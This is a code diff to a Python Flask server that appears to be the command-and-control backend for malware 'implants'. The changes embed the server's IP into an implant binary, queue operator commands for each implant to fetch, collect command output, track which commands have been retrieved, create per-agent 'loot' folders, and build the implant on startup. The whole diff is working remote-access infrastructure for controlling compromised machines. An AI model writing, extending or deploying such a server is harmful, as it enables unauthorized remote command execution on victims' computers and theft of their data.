@@ -33,7 +33,6 @@ def build_implant():
     config = {}
     config['ip'] = requests.get("https://api.ipify.org").text
     config = json.dumps(config).encode("utf-8")
-    print(config)
 
     with open('implant/payloads/implant', 'rb') as binFile:
         byteData = bytearray(binFile.read())
@@ -54,7 +53,7 @@ def add_agent(agent_dict):
         db.session.flush()
         agent_id = agent.id
         print(agent_id)
-        db.session.add(CommandQueue(agent_id, 'ls', 'asd'))
+        # db.session.add(CommandQueue(agent_id, 'ls', 'asd'))
         db.session.commit()
         print(agent_id)
         os.mkdir(f"loot/agent_{agent_id}")
@@ -81,12 +80,15 @@ def home():  # put application's code here
     output = ""
     if request.method == "POST":
         command = request.form['command']
-        agent_id = request.form['id']
-        res = CommandQueue.query.filter_by(id=agent_id).first()
+        implantID = request.form['id']
+        db.session.add(Commands(implantID=implantID, command=command))
+        db.session.flush()
+        db.session.commit()
+        res = Commands.query.filter_by(implantID=implantID).first()
         res.command = command
         db.session.commit()
         time.sleep(1)
-        res = CommandQueue.query.filter_by(id=agent_id).first()
+        res = Commands.query.filter_by(implantID=implantID).first()
         output = res.output
 
     agents = db.session.query(Agent).all()
@@ -107,8 +109,11 @@ def get_command():
     print(request.method)
     if request.method == 'POST':
         agent_id = request.json['id']
-        res = CommandQueue.query.filter_by(id=agent_id).first()
-        return res.command
+        res = Commands.query.filter(Commands.implantID==agent_id, Commands.retrieved==False).first()
+        if res == None:
+            return "None"
+        res.retrieved = True
+        return res.command + "," + str(res.commandID)
 
 
 @app.route('/api/1.1/command_out', methods=['POST'])
@@ -116,9 +121,10 @@ def command_out():
     print(request.method)
     if request.method == 'POST':
         output = request.json['output']
-        agent_id = request.json['id']
+        implantID = request.json['implantID']
+        commandID = request.json['commandID']
         # print(output, agent_id)
-        agent = CommandQueue.query.filter_by(id=agent_id).first()
+        agent = Commands.query.filter_by(implantID=implantID).first()
         agent.output = output
         agent.command = 'None'
         # print(agent.output)
@@ -172,4 +178,5 @@ def logout():
 
 
 if __name__ == '__main__':
+    build_implant()
     app.run(host="0.0.0.0")
